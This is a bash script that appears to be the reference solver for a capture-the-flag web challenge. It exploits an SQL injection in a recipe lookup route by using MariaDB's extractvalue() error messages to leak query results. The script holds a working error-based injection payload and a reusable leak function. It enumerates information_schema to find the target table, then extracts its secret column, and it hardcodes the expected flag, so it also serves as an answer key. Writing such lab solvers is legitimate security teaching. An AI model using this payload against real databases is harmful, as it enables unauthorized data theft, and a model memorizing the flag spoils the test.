#!/usr/bin/env bash
# solvers/p1_2.sh, Task 1.2 "Netero's Recipe Vault" canonical exploit.
#
# The recipe lookup route builds its query with raw string concatenation:
#   SELECT name FROM vault WHERE id='{id}'
# and, critically, surfaces the raw DBMS exception text back to the page
# on a query error. MariaDB's extractvalue() throws an XPATH syntax error
# whose message embeds (up to ~32 chars of) its second argument, so any
# subquery wrapped in extractvalue(1, concat(0x7e, (subquery))) gets its
# result smuggled into that error string, error-based extraction without
# ever seeing a normal result row.
#
# This script never hardcodes the target table/column names. It discovers
# them live, the same way a real attacker without source access would:
#   1. make one ordinary, non-malicious lookup and read what field label
#      the UI itself renders back (no SQL injection needed for this part)
#   2. confirm the oracle leaks arbitrary attacker-chosen text at all
#   3. read information_schema to find which table has both that
#      observed column (a `name` field the running app already showed
#      us) and `secret` (the field CHALLENGER.md's briefing names as the
#      objective), the combination that uniquely identifies the real
#      target in this seed's shared schema
#   4. only then extract that table's secret
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{100_type_error_leak}"

# leak <sql-expression>: wraps a scalar SQL expression in the
# extractvalue() oracle, sends it as the `id` param, and prints back
# whatever text MariaDB echoed inside the resulting XPATH syntax error.
leak() {
    local expr="$1"
    local payload="1' AND extractvalue(1,concat(0x7e,(${expr})))-- -"
    local resp
    resp=$(curl -s -G "${BASE}/p1/recipe" --data-urlencode "id=${payload}")
    echo "$resp" | grep -oP "XPATH syntax error: &#39;~\K[^&]*(?=&#39;)"
}

echo "[p1_2] step 1: make an ordinary, non-malicious lookup and read the label"
echo "  the UI renders back, no injection involved yet"
legit=$(curl -s -G "${BASE}/p1/recipe" --data-urlencode "id=1")
observed_field=$(echo "$legit" | grep -oP '(?<=text-muted">)[a-z_]+(?=&gt;</span>)')
echo "  GET ${BASE}/p1/recipe?id=1 -> rendered field label: '${observed_field}'"
if [[ -z "$observed_field" ]]; then
    echo "[p1_2] FAIL: could not find a rendered field label on a legitimate lookup"
    exit 1
fi

echo "[p1_2] step 2: confirm the error oracle leaks arbitrary attacker-chosen text"
canary=$(leak "'solver-canary-1234'")
echo "  id=1' AND extractvalue(1,concat(0x7e,'solver-canary-1234'))-- - -> leaked: '${canary}'"
if [[ "$canary" != "solver-canary-1234" ]]; then
    echo "[p1_2] FAIL: oracle did not echo back the canary string, sink may be broken"
    exit 1
fi
echo "  ok: the error message is a genuine read-arbitrary-text channel"

echo "[p1_2] step 3: find the table with both the observed '${observed_field}'"
echo "  column and a 'secret' column (the briefing's objective field);"
echo "  this schema is shared across every phase, so column_name='secret'"
echo "  alone matches more than one table"
table=$(leak "SELECT c1.table_name FROM information_schema.columns c1
    WHERE c1.table_schema=database() AND c1.column_name='secret'
    AND EXISTS (SELECT 1 FROM information_schema.columns c2
                WHERE c2.table_schema=c1.table_schema
                AND c2.table_name=c1.table_name
                AND c2.column_name='${observed_field}')
    LIMIT 1")
echo "  discovered table: '${table}'"
if [[ -z "$table" ]]; then
    echo "[p1_2] FAIL: could not discover a table with both ${observed_field}+secret columns"
    exit 1
fi

echo "[p1_2] step 4: extract the secret from the discovered table"
secret=$(leak "SELECT secret FROM ${table} LIMIT 1")
echo "  SELECT secret FROM ${table} LIMIT 1 -> '${secret}'"

if [[ "$secret" == "$FLAG" ]]; then
    echo "  ok: response contains flag: ${secret}"
    echo "[p1_2] PASS"
    exit 0
else
    echo "  FAIL: recovered value does not match the expected flag"
    echo "  expected: ${FLAG}"
    echo "  got:      ${secret}"
    echo "[p1_2] FAIL"
    exit 1
fi
